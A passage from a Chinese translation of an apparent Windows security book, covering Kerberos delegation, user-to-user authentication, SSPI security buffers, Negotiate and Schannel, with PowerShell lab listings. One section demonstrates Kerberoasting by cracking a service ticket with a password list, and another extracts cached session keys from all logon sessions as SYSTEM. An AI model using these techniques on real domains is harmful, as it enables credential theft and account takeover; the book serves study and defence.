最后一种受约束的委派类型——基于资源的委派，是在Windows Server 2012中引入的。它并未改变前述的底层委派过程，而是改变了为服务签发可转发票据的条件。该决策不再仅基于请求委派票据的账户，还会考虑所请求的目标SPN。

用户或计算机对象上的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性控制基于资源的委派。此属性是一个安全描述符，其中包含用户可委派到的每个账户的ACE。你可以使用 `Set-ADUser` 或 `Set-ADComputer` PowerShell命令，通过将用户或计算机的可分辨名称指定给 `PrincipalsAllowedToDelegateToAccount` 参数来设置它。在 代码清单 14-25 中，我们将 *GRAPHITE* 计算机账户添加到 *alice* 用户可委派到的账户列表中。




```
PS> Set-ADUser -Identity alice
-PrincipalsAllowedToDelegateToAccount (Get-ADComputer GRAPHITE)
PS> Get-ADUser -Identity alice -Properties 
PrincipalsAllowedToDelegateToAccount |
Select-Object PrincipalsAllowedToDelegateToAccount
PrincipalsAllowedToDelegateToAccount
------------------------------------
❶ {CN=GRAPHITE,CN=Computers,DC=mineral,DC=com}
PS> $name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
PS> (Get-ADUser -Identity alice -Properties $name)[$name] |
ConvertTo-NtSecurityDescriptor | Format-NtSecurityDescriptor -Summary
<Owner> : BUILTIN\Administrators
<DACL>
❷ MINERAL\GRAPHITE$: (Allowed)(None)(Full Access)
```


*代码清单 14-25：在用户账户上设置基于资源的委派*

这允许 *GRAPHITE* 计算机账户为 *alice* 用户的某个SPN请求服务票据。`Get-ADUser` 命令会显示目标账户的完整可分辨名称❶，但如果我们从属性中提取安全描述符并格式化它，可以看到在格式化后的DACL中，一个ACE里包含 *MINERAL\GRAPHITE$* SID❷。

当从S4U2self过渡到S4U2proxy时，客户端主体不需要设置 `TrustedToAuthForDelegation` 标志。作为一种控制机制，域控制器会提供两个组SID来指示令牌的来源。表 14-2 显示了这两个SID。

| 名称                                       | SID      | 描述                              |
| :----------------------------------------- | :------- | :--------------------------------------- |
| 身份验证机构断言的身份 | S-1-18-1 | 通过身份验证生成的令牌   |
| 服务断言的身份                  | S-1-18-2 | 通过S4U机制生成的令牌 |

第一个SID表示Token对象是通过向KDC提供身份验证凭据生成的。第二个SID分配给S4U2self或S4U2proxy令牌。安全描述符可以使用这些SID来限制对配置了资源委派的服务的访问，要么仅限于Kerberos委派（获取第一个SID），要么仅限于身份验证协议转换委派（获取第二个）。

如果配置不当，委派是一个危险的功能，而且很容易配置错误。这在从S4U2self通过受约束委派过渡到S4U2proxy时尤其明显，因为服务可以模拟域中的任何用户，包括特权用户。为降低此风险，系统可以在账户上将 `AccountNotDelegated` UAC标志设置为True，以阻止其被用于委派场景。在GUI中，此标志称为“账户敏感且无法委派”。你可以使用域管理员账户在域控制器上运行以下PowerShell命令来设置它：


```
PS> Set-ADUser -Identity alice -AccountNotDelegated $true
```


在 代码清单 14-26 中，我们查看此标志更改了什么以防止委派。




```
❶ PS> Get-ADUser -Identity alice -Properties AccountNotDelegated |
Select-Object AccountNotDelegated
AccountNotDelegated
-------------------
               True
PS> $client = New-LsaClientContext -CredHandle $credout -Target 
"HTTP/graphite"
PS> Unprotect-LsaAuthToken -Token $client.Token -Key $key | 
Format-LsaAuthToken
<KerberosV5 KRB_AP_REQ>
Options         : MutualAuthRequired
<Ticket>
Ticket Version  : 5
Server Name     : SRV_INST - HTTP/graphite
Realm           : MINERAL.LOCAL
❷ Flags           : Renewable, PreAuthent, EncPARep
--snip--
```


*代码清单 14-26：检查设置了AccountNotDelegated的账户的票据标志*

首先，我们确认 *alice* 用户已将 `AccountNotDelegated` 标志设置为True❶。然后，我们为该用户请求服务票据。通过解密它，我们可以看到 `Forwardable` 标志不再存在❷。如前所述，如果未设置 `Forwardable` 标志，TGS将拒绝基于现有服务票据签发新服务票据。这有效地自动阻止了委派。请注意，如果 `Forwardable` 标志已设置，并且你刚刚更改了 `AccountNotDelegated` 标志的值，我建议注销后重新以该用户身份登录，以确保该用户没有缓存的票据。

到目前为止，我们需要为用户或计算机配置SPN，以便KDC选择正确的共享加密密钥。还有一种替代身份验证模式，允许用户在没有SPN的情况下相互进行身份验证。让我们通过讨论如何在不为用户配置SPN的情况下使用Kerberos来结束本章。

### 用户到用户的 Kerberos 认证

NTLM 协议可以在非特权用户之间执行网络认证，但由于 Kerberos 账户需要映射的 SPN 才能授予票据，因此它通常无法做到这一点。为了支持非特权用户之间的认证，Windows Kerberos 包含了一项名为 *用户到用户（U2U）认证* 的功能。图 14-11 展示了 U2U 认证的基本操作流程。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-11.webp)

图 14-11：使用 Kerberos 进行用户到用户认证

在此图中，*alice* 希望向在 *bob* 账户下运行的服务进行认证。然而，*bob* 没有注册 SPN，因此当 *alice* 发出服务票据请求 ❶ 时，该请求会失败，因为 KDC 不知道目标 SPN。但由于请求的服务名称是 UPN 格式（即 bob@mineral.local），LSA 会假定用户希望进行 U2U 认证，并转而生成一个 TGT-REQ 消息。它将 TGT-REQ 消息发送给在 *bob* 账户下运行的服务 ❷。

服务接受 TGT-REQ 令牌，LSA 将 *bob* 缓存的 TGT 打包成 TGT-REP 消息，发送回客户端 ❸。（请注意，LSA 只是简单地获取调用者的缓存 TGT；它似乎并不关注 TGT-REQ 中的 UPN。因此，返回的 TGT 可能并非所请求用户的 TGT，这一点在下一步中至关重要。）

收到 TGT-REP 后，LSA 可以将 *alice* 的 TGT 和 *bob* 的 TGT 打包到 TGS-REQ 中，然后为 bob@mineral.local 请求服务票据 ❹。TGS 随后可以解密这些 TGT，验证额外的 TGT 是否属于所请求的用户账户，并生成一个用 *bob* 的 TGT 会话密钥加密的服务票据。如果额外的 TGT 不属于 *bob*（例如，因为服务并非在 *bob* 的账户下运行），则请求将失败。

假设请求成功，客户端的 LSASS 可以将服务票据打包成 AP-REQ 消息发送给服务，以完成认证 ❺。让我们运行一个测试来观察 U2U 认证的实际操作（代码清单 14-27）。




```
PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
❶ PS> $client = New-LsaClientContext -CredHandle $credout -Target 
bob@mineral.local
PS> Format-LsaAuthToken -Token $client.Token
❷ <KerberosV5 KRB_TGT_REQ>
Principal: bob@mineral.local
```


*代码清单 14-27：初始化 U2U 认证客户端*

首先，我们初始化 U2U 客户端认证上下文；请注意，这应以 *alice* 用户身份运行。您应该已经熟悉了大部分代码；唯一重要的区别是指定 bob@mineral.local 作为目标 SPN ❶。当我们格式化认证令牌时，会看到一个包含所需主体的 TGT-REQ 消息 ❷。现在，我们需要服务器认证上下文来继续认证过程（代码清单 14-28）。




```
PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
-ReadCredential
UserName: bob
Domain: MINERAL
Password: ******

PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext -Server $server -Client $client
PS> Format-LsaAuthToken -Token $server.Token
❶ <KerberosV5 KRB_TGT_REP>
Ticket Version  : 5
Server Name     : SRV_INST - krbtgt/MINERAL.LOCAL
Realm           : MINERAL.LOCAL
Encryption Type : AES256_CTS_HMAC_SHA1_96
Key Version     : 2
Cipher Text     :
00000000: 98 84 C6 F4 B3 92 66 A7 50 6E 9B C2 AF 48 70 09
00000010: 76 E9 75 E8 D6 DE FF A5 A2 E9 6F 10 A9 1E 43 FE
--snip--
```


*代码清单 14-28：创建服务器认证上下文并获取 TGT-REP*

我们首先创建凭据句柄，并从 shell 中读取 *bob* 的凭据。必须为 *bob* 指定凭据，否则服务器认证将使用 *alice* 的 TGT，这在为 bob@mineral.local SPN 创建服务票据时会失败。有了凭据句柄，我们就可以创建服务器认证上下文。

通过格式化返回的认证令牌，我们可以看到它是一个包含 TGT 票据的 TGT-REP 消息 ❶。我们不知道 *krbtgt* 用户的密码，因此无法解密它，这意味着无法判断该票据是否属于 *bob*。在 代码清单 14-29 中，我们使用 TGT-REP 消息更新客户端认证上下文，并打印新的认证令牌。




```
PS> Update-LsaClientContext -Client $client -Server $server
PS> Format-LsaAuthToken -Token $client.Token
❶ <KerberosV5 KRB_AP_REQ>
❷ Options         : UseSessionKey
<Ticket>
Ticket Version  : 5
❸ Server Name     : PRINCIPAL - bob
Realm           : MINERAL.LOCAL
Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text     :
00000000: 26 3B A8 9D DA 13 74 9F DC 47 16 83 0C AB 4F FF
00000010: 75 A3 45 E4 16 6F D1 E9 DA FA 71 E2 26 DE 42 8C
--snip--
```


*代码清单 14-29：继续 U2U 认证*

我们可以看到，现在有了要发送给服务器的 AP-REQ 消息 ❶。它包含一个用 *bob* 的会话密钥加密的票据 ❷，目标主体是 bob@mineral.local ❸。在 代码清单 14-30 中，我们回到服务器端。




```
❶ PS> Update-LsaServerContext -Server $server -Client $client
PS> Use-NtObject($token = Get-LsaAccessToken $server) {
    Get-NtLogonSession $token | Format-Table
}
LogonId           UserName       LogonType SessionId
-------           --------       --------- ---------
❷ 00000000-005CD2EF MINERAL\alice  Network   0
```


*代码清单 14-30：完成 U2U 认证*

我们完成认证 ❶，并查询 Token 对象，结果显示 *alice* 登录成功 ❷。

### 实际示例

让我们通过一些实际示例来演示如何使用本章中的各种命令进行安全研究或系统分析。

#### 查询Kerberos票据缓存

LSA为每个登录会话维护一个使用Kerberos请求的票据缓存。您可以使用`Get-KerberosTicket`命令查询当前用户的票据缓存，如代码清单 14-31所示。




```
❶ PS> Get-KerberosTicket | Select-Object ServiceName, EndTime
ServiceName                                           EndTime
-----------                                           -------
❷ SRV_INST - krbtgt/MINERAL.LOCAL                       3/19 6:12:15 AM
SRV_INST - LDAP/PRIMARYDC.mineral.local/mineral.local 3/19 6:12:15 AM

❸ PS> Get-KerberosTicket | Select-Object -First 1 | Format-KerberosTicket
Ticket Version  : 5
Server Name     : SRV_INST - krbtgt/MINERAL.LOCAL
Realm           : MINERAL.LOCAL
Encryption Type : AES256_CTS_HMAC_SHA1_96
Key Version     : 2
Cipher Text     :
00000000: 10 F5 39 C5 E1 6D BB 59 E0 CF 04 61 F6 2D CF E2
00000010: 94 B3 88 46 DB 69 88 FF F4 F2 8B 52 AD 48 20 9C
00000020: 2D AE A4 02 4B 9E 75 F3 D0 05 23 63 70 31 E4 88
00000030: 4F 3E DD E7 23 DE 4B 7A 0D A9 47 62 90 6E 24 65
--snip--
```


*代码清单 14-31：查询Kerberos票据缓存*

首先，我们查询票据❶，选择`ServiceName`（票据的SPN）和`EndTime`（票据的过期时间，届时必须续订）字段。缓存中的第一个票据是用户的TGT，用于请求服务票据❷。在此示例中，我们还有一个用于LDAP目录服务器的服务票据。

我们可以使用`Format-KerberosTicket`命令查看缓存的Kerberos票据❸，但票据仍然是加密的，而且由于我们可能不知道目标服务的共享密钥，因此无法解密。理论上，我们可以将票据发送到目标服务以直接进行身份验证。然而，我们也没有提取到的会话密钥来加密有效的AP-REQ中的身份验证数据，因此我们需要调用SSPI基于缓存的票据生成AP-REQ。

但是，如果您启用了`SeTcbPrivilege`，每个票据缓存条目应包含会话密钥。代码清单 14-32展示了如何查询所有本地登录会话的所有票据并提取缓存的会话密钥。




```
PS> $sess = Get-NtLogonSession
PS> $tickets = Invoke-NtToken -System {Get-KerberosTicket -LogonSession $sess}
PS> $tickets | Select-Object ServiceName, {Format-HexDump $_.SessionKey.Key}
ServiceName                      Format-HexDump $_.SessionKey.Key
-----------                      --------------------------------
SRV_INST - krbtgt/MINERAL.LOCAL  EE 3D D2 F7 6F 5F 7E 06 B6 E2 4E 6C C6 36 59 64
--snip--
```


*代码清单 14-32：提取所有票据和会话密钥*

我们首先获取可传递给`Get-KerberosTicket`的登录会话列表。要查询除调用者之外的任何登录会话的票据，我们需要启用`SeTcbPrivilege`，因此在查询缓存时我们模拟*SYSTEM*用户。

模拟*SYSTEM*还允许我们获取会话密钥。我们可以将密钥格式化为十六进制，并附带缓存票据的SPN。有了票据和会话密钥，我们就可以实现自己的服务身份验证请求。

#### 简单的Kerberoasting

与票据缓存交互的一个潜在原因是为了获取用于 Kerberoasting 的票据，这是一种在“银票与 Kerberoasting”旁注框中描述的攻击。然而，您不需要为此攻击查询缓存，因为您可以使用SSPI API找到所有所需信息。让我们通过一个简单示例来理解Kerberoasting过程的工作原理。首先，在代码清单 14-33中，我们查询所有配置了SPN的用户账户。




```
PS> Get-ADUser -Filter {
    ObjectClass -eq 'user'
} -Properties ServicePrincipalName |
Where-Object ServicePrincipalName -ne $null |
Select SamAccountName, ServicePrincipalName
SamAccountName ServicePrincipalName
-------------- --------------------
krbtgt         {kadmin/changepw}
alice          {HTTP/graphite}
sqlserver      {MSSQL/topaz.mineral.local}
```


*代码清单 14-33：检查配置了SPN的用户*

我们看到* krbtgt *用户，以及* alice *仍然具有我们本章前面配置的HTTP/graphite SPN。我们还看到一个SQL服务器的账户，其SPN为MSSQL/topaz.mineral.local。

我们不希望选择* krbtgt *作为目标，因为该账户将具有复杂的密码，难以暴力破解（任何配置了SPN的计算机账户也会自动配置复杂的密码）。我们将尝试暴力破解* sqlserver *用户的密码。首先，我们需要为其SPN发出请求并接收票据（代码清单 14-34）。




```
PS> $creds = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
PS> $client = New-LsaClientContext -CredHandle $creds
-Target "MSSQL/topaz.mineral.local"
PS> Format-LsaAuthToken $client
<KerberosV5 KRB_AP_REQ>
Options         : None
<Ticket>
Ticket Version  : 5
Server Name     : SRV_INST - MSSQL/topaz.mineral.local
Realm           : MINERAL.LOCAL
Encryption Type : ARCFOUR_HMAC_MD5
Key Version     : 2
Cipher Text     :
00000000: F3 23 A8 DB C3 64 BE 58 48 7A 4D E1 20 50 E7 B9
00000010: CB CA 17 59 A3 5C 0E 1D 6D 56 F9 B5 5C F5 EE 11
--snip--
```


*代码清单 14-34：获取* sqlserver *用户的服务票据*

现在我们有了票据，可以基于密码列表生成密钥。然后，我们可以尝试用每个密钥解密票据，直到找到有效的密钥，如代码清单 14-35所示。




```
PS> $pwds = "ABC!!!!", "SQLRUS", "DBPassw0rd"
PS> foreach($pwd in $pwds) {
    $key = Get-KerberosKey -Password $pwd -KeyType ARCFOUR_HMAC_MD5
-NameType SRV_INST -Principal "MSSQL/topaz.mineral.local@mineral.local"
    $dec_token = Unprotect-LsaAuthToken -Key $key -Token $client.Token
  ❶ if ($dec_token.Ticket.Decrypted) {
        Write-Host "Decrypted ticket with password: $pwd"
        break
    }
}
Decrypted ticket with password: DBPassw0rd
```


*代码清单 14-35：使用一组密码解密票据*

我们可以通过查询其`Decrypted`属性❶来检查票据是否被解密。如果解密成功，我们则将密码打印到控制台。在此案例中，我们发现* sqlserver *用户的密码是DBPassw0rd——可能不是最安全的选择！请注意，此示例脚本效率不高且速度不快。它之所以简单，是因为票据使用RC4加密算法加密；您可以将相同技术应用于AES，但暴力破解尝试将花费更长时间，因为AES密钥派生更为复杂。

为了获得更好的性能，建议使用其他工具，例如由SpecterOps的Will Schroeder最初开发的Rubeus（*https://github.com/GhostPack/Rubeus*）。该工具能够获取票据，并利用它生成哈希，供您输入到诸如John the Ripper（*https://www.openwall.com/john/*）这样的快速密码破解工具中。

### 总结

本章深入探讨了Kerberos协议，这是自Windows 2000以来用于Windows域认证的协议。我们研究了在Windows域控制器上实现的关键分发中心，它保存了网络中所有用户和计算机关联的密钥列表，并了解了Kerberos如何利用这些密钥（通常从账户密码派生）来认证票据，进而向网络中的服务进行认证。

为了支持复杂的认证场景，Kerberos允许凭据的委派。我们详细讨论了这一主题，包括约束性委派和非约束性委派，以及相关的服务用户机制。本章最后描述了用户对用户认证，该机制允许两个用户在没有向域注册SPN的情况下相互认证。

下一章（也是最后一章）将介绍一些额外的网络认证协议，并更深入地探讨SSPI API的使用方式。

## 15. 协商认证及其他安全包

前两章涵盖了Windows中两个主要的网络认证协议：NTLM和Kerberos。然而，Windows还支持其他多个用于执行认证的包。在本章中，我们将简要介绍其中一些其他安全包。

首先，我将更详细地说明应用程序和安全包如何使用缓冲区通过SSPI API来回传递数据。这将帮助您理解这些包的一些特殊行为。然后，我们将探讨协商安全包，以及不太常见的安全通道和CredSSP包。我将简要概述在设置网络认证上下文时可用的一些额外配置选项，最后描述当您希望在具有低盒令牌的进程内使用网络认证时会发生什么。

### 安全缓冲区

到目前为止，我暗示使用SSPI API很简单：生成客户端身份验证令牌，将其传递给服务器应用程序，更新服务器身份验证上下文，接收响应令牌，并重复此过程直至身份验证完成。然而，由于所支持的网络身份验证协议的复杂性，这些API可以接受并返回的不仅仅是身份验证令牌。

身份验证上下文、加密和签名API接受通用*安全缓冲区*结构数组作为参数。这种安全缓冲区结构在原生SDK中称为SecBuffer，在PowerShell模块中由SecurityBuffer类封装。每个安全缓冲区结构包含一个字段，用于确定缓冲区代表的数据类型，以及一个用于内容的有大小限制的内存缓冲区。您可以使用New-LsaSecurityBuffer PowerShell命令创建缓冲区，指定缓冲区的类型和内容：


```
PS> $buf = New-LsaSecurityBuffer -Type Data -Byte @(0, 1, 2, 3)
```


您可以在初始化数据时指定字节数组或字符串。您还需要为缓冲区指定类型。以下是您会遇到的最重要的缓冲区类型的简短列表：

Empty  不包含数据；有时用作返回值的占位符

Data  包含已初始化的数据；用于传递和返回数据，例如要加密的消息

Token  包含令牌；用于传递和返回身份验证令牌和签名

PkgParams  包含安全包的其他配置参数

StreamHeader  包含流协议的头部

StreamTrailer  包含流协议的尾部

Stream  包含流协议的数据

Extra  包含安全包生成的额外数据

ChannelBindings  包含通道绑定数据

您可以将安全缓冲区用作输入或输出，具体取决于安全包的要求和所使用的API。如果您想定义一个仅输出的缓冲区，可以在创建缓冲区时使用Size参数：


```
PS> $buf = New-LsaSecurityBuffer -Type Data -Size 1000
```


有时您可能希望传递一个已初始化的缓冲区，而包不应修改其内容。为了表明这一点，API指定了两个您可以添加到类型中的附加标志：

ReadOnly  缓冲区是只读的，但不属于签名的一部分。

ReadOnlyWithChecksum  缓冲区是只读的，并且应作为签名的一部分。

您可以在创建缓冲区时使用ReadOnly或ReadOnlyWithChecksum参数指定这些附加标志，如下例所示：


```
PS> $buf = New-LsaSecurityBuffer -Type Data -Byte @(0, 1, 2, 3) -ReadOnly
```


这两个只读标志之间的差异是否被尊重取决于安全包。例如，NTLM忽略差异并始终将只读缓冲区添加到签名中，而Kerberos仅当您提供的缓冲区具有ReadOnlyWithChecksum标志时才将缓冲区作为签名的一部分添加。

#### 将缓冲区与身份验证上下文一起使用

Update-LsaClientContext和Update-LsaServerContext PowerShell命令使用的SSPI API接受两个安全缓冲区列表：一个用作API的输入，一个用作输出。您可以使用InputBuffer和OutputBuffer参数指定这些缓冲区的列表，如代码清单 15-1所示。




```
❶ PS> $in_buf = New-LsaSecurityBuffer -Type PkgParams -String "AuthParam"
❷ PS> $out_buf = New-LsaSecurityBuffer -Type Data -Size 100
❸ PS> Update-LsaClientContext -Client $client -Token $token -InputBuffer $in_buf
-OutputBuffer $out_buf
PS> $out_buf.Type
Extra

PS> ConvertFrom-LsaSecurityBuffer $out_buf | Out-HexDump
00 11 22 33
```


*代码清单 15-1：在身份验证上下文中使用输入和输出缓冲区*

此清单展示了在身份验证期间使用输入和输出缓冲区的假设情况。（您将在本章中看到实际示例。）此示例假设您已经将客户端身份验证上下文设置为$client，并将服务器身份验证令牌设置为$token。

我们首先创建一个类型为PkgParams的输入缓冲区，包含一个字符串❶。缓冲区的内容取决于您所使用的包；通常，API的文档会告诉您需要指定什么。接下来，我们创建一个类型为Data的输出缓冲区，分配最大缓冲区大小为100字节❷。然后我们更新客户端上下文，传递服务器身份验证令牌以及输入和输出缓冲区❸。

该命令会将令牌作为Token类型缓冲区添加到输入列表的开头，并且还会附加在创建上下文时指定的任何通道绑定。因此，在这种情况下传递的输入缓冲区列表将包含Token缓冲区，后跟PkgParams缓冲区。有时包不希望您包含Token缓冲区；在这种情况下，您可以指定NoToken参数将其从输入列表中排除。

该命令还会自动将新的身份验证令牌的输出Token缓冲区添加到输出列表。如果API调用成功，它会将此缓冲区的内容分配给上下文的Token属性。通常不需要从输出中排除该缓冲区，因此该命令不提供该选项。

调用成功后，我们检查输出缓冲区，该缓冲区已被更新。某些包可能会改变输出缓冲区的类型、大小和内容。例如，在此示例中，类型已从 `Data` 更改为 `Extra`。我们可以使用 `ConvertFrom-LsaSecurityBuffer` 命令将缓冲区转换回字节数组。显示输出表明，我们创建的 100 字节缓冲区现在仅有 4 个有效字节。安全包初始化了这 4 个字节，并相应地更新了结构的长度。

#### 使用缓冲区进行签名和密封

使用 `Buffer` 参数，您可以在调用 `Get-LsaContextSignature` 和 `Test-LsaContextSignature` PowerShell 命令，以及 `Protect-LsaContextMessage` 和 `Unprotect-LsaContextMessage` 时，指定用于签名和密封操作的缓冲区。底层 API 仅接受一个缓冲区列表，用于输入和输出。在 代码清单 15-2 中，我们加密了一个包含附加头部的缓冲区。




```
PS> $header = New-LsaSecurityBuffer -Type Data -Byte @(0, 1, 3, 4)
-ReadOnlyWithChecksum
PS> $data = New-LsaSecurityBuffer -Type Data -String "HELLO"
PS> $sig = Protect-LsaContextMessage -Context $client -Buffer $header, $data
PS> ConvertFrom-LsaSecurityBuffer -Buffer $header | Out-HexDump
00 01 03 04

PS> ConvertFrom-LsaSecurityBuffer -Buffer $data | Out-HexDump
D5 05 4F 40 22 5A 9F F9 49 66

PS> Unprotect-LsaContextMessage -Context $server -Buffer $header, $data
-Signature $sig
PS> ConvertFrom-LsaSecurityBuffer -Buffer $data -AsString
HELLO
```


*代码清单 15-2：使用缓冲区加密消息*

我们首先创建头部缓冲区，并将其标记为只读并带有校验和。通过将其标记为只读，我们确保内容不会被加密，但仍会包含在签名中。接下来，我们从字符串创建数据缓冲区。

然后，我们将缓冲区传递给 `Protect-LsaContextMessage`。此命令返回加密操作的签名，并就地更新加密数据。转储缓冲区时，我们可以看到，即使数据缓冲区已被加密，头部仍然未加密。

我们可以使用 `Unprotect-LsaContextMessage` 以类似于加密缓冲区的方式解密缓冲区：将缓冲区和签名传递给命令。一旦缓冲区被解密，我们可以将其转换回字符串。如果缓冲区的签名无效，命令将抛出错误。

既然您已经了解了如何为 SSPI API 使用安全缓冲区，接下来让我们看看 Negotiate 协议，该协议允许 Windows 根据调用者可用的凭据自动选择最佳的身份验证协议。

### 协商协议

如果你不知道服务器支持哪些类型的网络认证，该怎么办？你可能会先尝试使用Kerberos，如果不被支持，再切换到NTLM。但这并不是一种高效的资源利用方式。此外，如果微软将来引入一种新的、更安全的认证协议，你就必须更新应用程序以支持它。*协商*协议通过允许客户端和服务器协商最佳可用的网络认证协议，解决了这两个问题。微软对协商协议的实现基于*简单与受保护协商机制（SPNEGO）*协议，该协议定义于RFC4178中。

要选择协商协议，请在客户端和服务器认证上下文中都使用协商包。客户端认证上下文生成的第一个令牌包含客户端支持的认证协议列表。在其ASN.1结构中，它还可以嵌入客户端倾向于使用的受支持认证协议的第一个认证令牌。例如，它可能嵌入一个NTLM NEGOTIATE令牌。在代码清单 15-3中，我们初始化协商客户端认证上下文。




```
❶ PS> $credout = New-LsaCredentialHandle -Package "Negotiate" -UseFlag Outbound
PS> $client = New-LsaClientContext -CredHandle $credout
PS> Format-LsaAuthToken -Token $client.Token
❷ <SPNEGO Init>
❸ Mechanism List    :
1.3.6.1.4.1.311.2.2.10         - NTLM
1.2.840.48018.1.2.2            - Microsoft Kerberos
1.2.840.113554.1.2.2           - Kerberos
1.3.6.1.4.1.311.2.2.30         - Microsoft Negotiate Extended
❹ <SPNEGO Token>
<NTLM NEGOTIATE>
Flags: Unicode, Oem, RequestTarget, Signing, LMKey, NTLM,...
Domain: MINERAL
Workstation: GRAPHITE
Version: 10.0.18362.15
</SPNEGO Token>
```


*代码清单 15-3：初始化协商客户端认证*

我们指定使用协商安全包的凭据❶，然后像往常一样继续创建上下文。在格式化后的令牌中，我们首先看到SPNEGO Init，这表明这是一个初始化令牌❷。在头部之后是受支持认证协议（或*安全机制*）的列表❸。该列表按偏好降序排列，因此在此例中，客户端更偏好NTLM而非Kerberos。除非你处于加入域的系统上，否则你不会在列表中看到Kerberos。

你可能会注意到机制列表包含两种类型的Kerberos。Microsoft Kerberos标识符的存在是由于Windows 2000中的一个错误：标识符中的值113554（十六进制为0x1BB92）被截断为16位，导致值为0xBB92（即48018）。出于向后兼容的原因，微软保留了这个错误，这两个值代表相同的Kerberos认证协议。微软还定义了一个扩展协商协议，即此列表中的第四个机制，但我们在此不做讨论。

在受支持协议列表之后是一个认证令牌❹。在此例中，客户端选择发送初始的NTLM NEGOTIATE令牌。

服务器认证上下文可以选择其支持的最合适的认证协议。最常见的情况是，它将使用客户端首选协议，这由受支持认证协议列表的排序决定。然而，如果需要，它也可以忽略客户端的偏好，请求不同的认证协议。它将选定的认证协议及任何进一步的认证令牌发送给客户端。此认证交换过程持续进行，直到发生错误或过程完成。代码清单 15-4展示了服务器如何响应客户端的请求。




```
PS> $credin = New-LsaCredentialHandle -Package "Negotiate" -UseFlag Inbound
PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext -Server $server -Token $client.Token
PS> Format-LsaAuthToken -Token $server.Token
<SPNEGO Response>
Supported Mech    : 1.3.6.1.4.1.311.2.2.10 - NTLM
State             : Incomplete
<SPNEGO Token>
<NTLM CHALLENGE>
Flags     : Unicode, RequestTarget, Signing, NTLM, LocalCall, AlwaysSign,...
--snip--
```


*代码清单 15-4：在服务器上继续协商认证*

我们首先将客户端认证令牌传递给我们创建的服务器认证上下文。在格式化输出中，我们可以看到这是一个SPNEGO响应，并且服务器已选择使用NTLM。该响应有一个State标志，表明协商当前尚未完成。紧随其后的是认证令牌，正如预期的那样，现在是一个NTLM CHALLENGE令牌。

在代码清单 15-5中，我们完成认证。




```
PS> Update-LsaClientContext -Client $client -Token $server.Token
PS> Format-LsaAuthToken -Token $client.Token
<SPNEGO Response>
State             : Incomplete
<SPNEGO Token>
❶ <NTLM AUTHENTICATE>
Flags      : Unicode, RequestTarget, Signing, NTLM, LocalCall, AlwaysSign,...
--snip--

PS> Update-LsaServerContext -Server $server -Token $client.Token
PS> Format-LsaAuthToken -Token $server.Token
<SPNEGO Response>
❷ State            : Completed

❸ PS> Update-LsaClientContext -Client $client -Token $server.Token
PS> $client.PackageName
NTLM
```


*代码清单 15-5：完成协商认证*

发送的下一个客户端认证令牌是NTLM AUTHENTICATE令牌❶。请注意，受支持认证协议字段不存在。该字段仅在初始服务器令牌中是必需的，在后续令牌中被省略。

在正常的NTLM认证中，认证通常会在此时完成。然而，在协商认证中，客户端的状态被视为“未完成”，直到我们生成最终的服务器令牌并用此令牌更新客户端，随后状态才标记为“已完成”❷。然后，我们可以使用PackageName属性❸查询最终包，结果显示我们协商了NTLM。

为协商使用Kerberos，该协议以类似方式运作。但由于Kerberos需要SPN才能运行，在创建客户端认证上下文时，您必须通过Target参数指定目标名称；否则，协议将选择NTLM。Kerberos认证的输出将用Kerberos AP-REQ和AP-REP令牌替换NTLM令牌。

既然我们已经涵盖了Negotiate协议，接下来讨论一些在分析Windows系统时可能遇到的较少见的安全包。

### 较少见的安全包

我们已经介绍了在Windows上最可能使用的三个主要安全包：NTLM、Kerberos和Negotiate。但还有一些其他安全包具有重要功能，即使你直接使用它们的可能性较小。我们不会花太多时间讨论这些，但我会为每个包提供一个快速示例，以便你理解它们的目的和功能。

#### 安全通道

通过互联网未加密地发送敏感信息（如用户凭据）通常被认为是不明智的。有几种网络协议可以加密网络流量，但最常用的无疑是*传输层安全（TLS）*，它曾被称为*安全套接字层（SSL）*，最初由Netscape在20世纪90年代中期开发，用于保护HTTP连接。TLS的一种变体，*数据报传输层安全（DTLS）*协议，可以加密来自不可靠协议（如*用户数据报协议（UDP）*）的流量。

*安全通道*是作为安全包提供的TLS实现，你可以通过Schannel包使用与其他网络身份验证协议相同的SSPI API来访问它。虽然你可以将安全通道用作网络流量的TLS或DTLS加密层，但也可以利用它通过客户端证书向服务器提供客户端身份验证功能。

让我们通过一个简单示例来了解如何使用该包。代码清单 15-6首先设置客户端凭据句柄和客户端身份验证上下文。




```
PS> $credout = New-LsaCredentialHandle -Package "Schannel" -UseFlag Outbound
PS> $name = "NotReallyReal.com"
PS> $client = New-LsaClientContext -CredHandle $credout -Target $name
-RequestAttribute ManualCredValidation
PS> Format-LsaAuthToken -Token $client.Token
SChannel Record 0
Type   : Handshake
Version: 3.3
Data    :
          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 01 00 00 AA 03 03 60 35 C2 44 30 A9 CE C7 8B 81  - ......`5.D0.....
00000010: EB 67 EC F3 9A E3 FD 71 05 70 6C BB 92 19 31 C9  - .g.....q.pl...1.
--snip--
```


*代码清单 15-6：设置安全通道客户端身份验证上下文*

在设置上下文时，你需要指定一个目标名称，通常是服务器的DNS名称。协议使用此目标名称来验证服务器是否具有该名称的有效证书。TLS连接也可以被缓存，因此协议可以检查目标名称是否已有缓存条目。在本例中，名称无关紧要，因为我们指定了`ManualCredValidation`请求属性，该属性禁用服务器证书检查，以便我们可以为服务器使用自签名证书。

然后，我们格式化身份验证令牌，它展示了TLS协议的简单记录结构（如图15-1所示）。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure15-1.webp)

图15-1：TLS记录结构

记录结构包含一个5字节的头部，由记录类型、协议的主次版本和数据长度组成。头部之后是一系列字节，其解释取决于记录类型。在代码清单 15-6中，类型为`Handshake`，这是在连接建立期间用于协商要使用的加密协议、交换证书和传达加密密钥的记录。其版本为3.3，对应TLS 1.2。（协议设计者认为TLS是对SSL 3.0的次要补充，因此仅增加了次版本号。）

